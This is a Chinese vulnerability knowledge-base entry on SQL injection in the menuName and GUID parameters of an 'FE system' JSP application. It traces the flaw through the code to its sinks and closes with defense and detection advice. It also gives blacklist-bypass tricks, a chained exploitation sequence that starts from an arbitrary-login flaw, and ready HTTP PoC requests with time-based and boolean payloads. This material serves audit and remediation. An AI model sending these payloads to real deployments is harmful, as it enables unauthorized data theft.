---
id: web-generic-sqli-fe-system-jdbc-concat-treexml-editflow
title: FE 系统 JDBC 拼接 SQL 注入：treeXml.jsp menuName 与 editflow_manager.jsp GUID 直入 WHERE
type: scenario
domain: web
path: web/generic/sqli
technique: fe-jdbc-filter-concat-sqli
tags:
- java
- jsp
- jdbc
- sqli
- concatenation
- prepared-statement
- code-audit
- fe
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:54:42+08:00'
  notes: 已对照原文及49张图核对：图45 treeXml.jsp 第27行 menuName=request.getParameter，第40行 setTree 拼 SF07='+menuName+'；图44 FunctionTree.setTree 直调 dao.getDataTable(tableName,filter,orderby)；图39-42 BasicDaoImpl 将 filter 以 where 拼入 SQL 并由 PageConnectionCallbackImpl createStatement/executeQuery；图46-49 editflow_manager.jsp option=2 的 GUID 拼入 WI62='...'，getStringData 最终 prepareStatement(sql) 且 params 为 null，拼接值不作为参数绑定。卡对 sqlValidate 黑名单 %20 的绕过说明与图12一致。原文无执行结果。PoC 未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-fe-system-jdbc-concat-treexml-editflow/
draft: false
kb_aliases:
- FE 系统 SQL 注入
- treeXml.jsp menuName 注入
- FunctionTree setTree 注入
- editflow_manager.jsp GUID 注入
- BasicDaoImpl getDataTable 注入
- JDBC 拼接注入
---

## 一句话结论

FE 系统的 JDBC 数据访问层虽然大量使用预编译，但 `treeXml.jsp` 把 `menuName` 拼进 `FunctionTree.setTree()` 的 filter 条件，`editflow_manager.jsp` 把 `GUID` 拼进 `select ... where WI62='...'`，两处最终都进入 `BasicDaoImpl`/`SysTableDao` 的 `executeQuery`/`prepareStatement(sql)`；由于 SQL 文本已包含用户输入，预编译参数为空，形成可注入的 JDBC SQL 注入。

## 原理

- **入口一：`treeXml.jsp` → `FunctionTree.setTree`**
  - JSP 第 27 行左右：`String menuName = StringUtil.ISOToUTF8(request.getParameter("menuName"));`
  - 第 40 行左右：
    ```java
    treeUtil.setTree("SYS_FUNCTION",
        "SF07='" + menuName + "' and SF04<>'3'",
        "SF05 ASC,SF27 DESC");
    ```
  - `FunctionTree.setTree(String tableName, String filter, String orderby)` 直接 `this.dao.getDataTable(tableName, filter, orderby)`，中间没有参数化。
- **入口二：`editflow_manager.jsp`**
  - `option=2` 分支：`String GUID = request.getParameter("GUID");`
  - `String sql = "select WI13 from " + dao.getTableName("WF_INFOR") + " where WI62='" + GUID + "'";`
  - `String procType = dao.getStringData(sql); out.print(procType);`
- **数据访问层为什么拦不住**：
  - `BasicDaoImpl.getDataTable(...)` 根据分页/复杂字段选择 `sqlParse.getSelectFieldSql(tableMeta, filter, fields)` 或 `getPageSql(...)`，两者都把 `filter` 直接 `append(" where ") + filter`；随后 `PageConnectionCallbackImpl` 构造 `Statement stmt = conn.createStatement(...); stmt.executeQuery(this.sql)`。
  - `SysTableDao.getStringData(sql, params)` → `getStringData(sql, params, debug=true)`；即使使用 `conn.prepareStatement(sql)`，SQL 文本里已经拼好了 `GUID`，`params` 为 null 或只绑定其他参数，注入值不会作为参数处理。预编译只对占位符有效，对“拼接后的 SQL 文本”无效。
- **为什么成立**：两处参数都来自 `request.getParameter`，未经转义/白名单就进入 WHERE 子句；数据库账号可执行 SELECT，攻击者可用布尔/时间/报错注入读取数据。
- **过滤器的影响**：`ControllerFilter5.sqlInjection` 对 queryString 做黑名单，但黑名单字符串大多带字面量 `%20`（如 `select%20`、`exec%20`），而 `getQueryString()` 返回原始未解码串；攻击者用 `/**/`、`+` 等分隔符即可不命中 `%20`，把 `select`/`and`/`sleep` 等关键字送进业务。该黑名单只增加门槛，不改变注入本质。
- **鉴权**：`treeXml.jsp`、`editflow_manager.jsp` 属于 `.jsp`，会经过 `ControllerFilter5`，且部分 JSP 还会检查 session（如 `_$government`）；利用前需要有效会话，或先结合该系统的任意登录/过滤器绕过。

## 触发条件

- 目标部署该 FE 系统，`treeXml.jsp` 与 `editflow_manager.jsp` 可访问。
- 参数 `menuName`/`GUID` 可到达对应 JSP 并进入 SQL 拼接；`option=2` 分支可触发 `GUID` 查询。
- 攻击者持有有效会话（或利用任意登录/鉴权绕过）；JSP 自身的 session 校验未额外拦截。
- 数据库为 MySQL/Oracle 等常见 JDBC 数据库，注入语法按方言调整；数据库账号可执行查询。

## 利用步骤

1. 获取会话：通过任意登录漏洞（`op=D` 等）或过滤器绕过获得有效 `JSESSIONID`。
2. 确认 `treeXml.jsp` 可达：GET `/xxx/treeXml.jsp?menuName=test`，观察返回树 XML/错误。
3. 在 `menuName` 中闭合单引号并注入：先用布尔条件（`' and 1=1-- ` / `' and 1=2-- `）对比响应；再用时间盲注 `'/**/and/**/sleep(5)#` 确认。
4. 若被 `ControllerFilter5` 的 SQL 黑名单拦截，把空格换成 `/**/` 或 `+`，避免出现字面量 `%20`。
5. 对 `editflow_manager.jsp`：POST/GET `option=2&GUID=x' and ...-- `，观察 `procType` 回显；`GUID` 位置为单引号包裹的字符串，闭合后注入。
6. 按数据库方言提取表名、账号口令哈希等数据；注意不要执行破坏性语句。

## PoC

时间盲注（treeXml.jsp，`menuName`）：

```http
GET /xxx/treeXml.jsp?menuName=x'/**/and/**/sleep(5)%23 HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
```

布尔对比：

```http
GET /xxx/treeXml.jsp?menuName=x'/**/and/**/1=1%23 HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
```

```http
GET /xxx/treeXml.jsp?menuName=x'/**/and/**/1=2%23 HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
```

`editflow_manager.jsp`（GUID 拼入 `where WI62='...'`）：

```http
POST /xxx/editflow_manager.jsp HTTP/1.1
Host: target
Cookie: JSESSIONID=<valid-session>
Content-Type: application/x-www-form-urlencoded

option=2&GUID=x'/**/and/**/sleep(5)%23
```

说明：`#` 在 URL 中应编码为 `%23`；若目标数据库不支持 `#` 注释，用 `-- `（末尾空格编码）或 `/* */` 调整。PoC 依据源码构造，原文未给出执行结果，本会话未执行。

## 变体与关联

- **注入位置**：`treeXml.jsp` 的 `menuName` 进入 `SF07='...'`；`editflow_manager.jsp` 的 `GUID` 进入 `WI62='...'`。其他调用 `FunctionTree.setTree`/`getDataTable` 的 JSP 也可能有同类拼接，可按 sink 回溯。
- **黑名单绕过**：`sqlValidate` 的 `badStrs` 多数包含 `%20`，用 `/**/`、`+`、`%09` 等替代空格；大小写、注释、内联注释版本也可组合。
- **数据库方言**：MySQL 用 `sleep()`、`benchmark()`；Oracle 用 `dbms_pipe.receive_message`/`utl_inaddr`；SQL Server 用 `waitfor delay`；按报错/延时选择。
- **鉴权组合**：`GetPdfFile`、`ProxyServletUtil` 等接口可提供会话或进一步读取配置；任意登录漏洞可直接获得会话。
- 关联：[[web-generic-auth-fe-login-opd-admin-session]]（任意管理员登录提供会话）；[[web-generic-auth-fe-controllerfilter5-excludepage-prefix-bypass]]（无会话时绕过过滤器）；[[web-generic-sqli-java-identifier-table-order-by-injection]]（JDBC 拼接/标识符注入的通用形态）；[[code-analysis-source-audit-jdbc-hql-concat-regex]]（大项目拼接 SQL 审计方法）。

## 检测与防御

- **代码修复**：所有值位置使用 `PreparedStatement` 的 `?` 占位并绑定参数；`filter` 这类动态条件不要传字符串 SQL 片段，改为结构化条件（列名白名单 + 值参数）；`menuName`/`GUID` 做类型/长度/字符白名单校验。
- **数据访问层**：`BasicDaoImpl`/`SysTableDao` 不应接受已拼好的 WHERE 片段作为公共 API；对无法参数化的标识符位置用枚举映射。
- **过滤器**：不要依赖带字面量 `%20` 的黑名单；统一在业务层做参数化，过滤器只做辅助防护；对 `/**/`、`+`、注释符等做检测。
- **检测特征**：`menuName`/`GUID` 参数含单引号、`/**/`、`--`、`#`、`sleep`、`benchmark`、`union`；SQL 日志出现拼接后的异常语句；响应时间随 `sleep` 变化；数据库报错暴露 SQL 片段。
- **加固**：数据库账号最小权限；关闭详细 SQL 报错；对后台 JSP 做统一鉴权与访问审计。
